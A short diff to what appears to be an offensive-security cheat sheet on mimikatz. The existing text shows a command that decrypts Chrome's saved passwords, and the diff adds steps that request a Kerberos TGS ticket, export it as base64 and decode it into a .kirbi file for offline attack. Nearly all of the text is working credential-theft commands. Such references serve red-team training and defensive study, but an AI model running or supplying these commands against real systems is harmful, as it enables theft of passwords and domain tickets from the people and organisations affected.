@@ -49,5 +49,13 @@ To decrypt chrome passwords:
 mimikatz# dpapi::chrome /in:"%localappdata%\Google\Chrome\User Data\Default\Login Data" /unprotect
 ```
 
+Request a TGS ticket:
+
+```shell!
+mimikatz> kerberos::ask /target:cn # request TGS for cn
+mimikatz> base64 /out:true
+mimikatz> kerberos::list /export # cat b64 | tr -d '\n' | base64 -d > cn.kirbi
+```
+
 📚 See also: [pypykatz](pypykatz.md) for Linux users.
 </div></div>
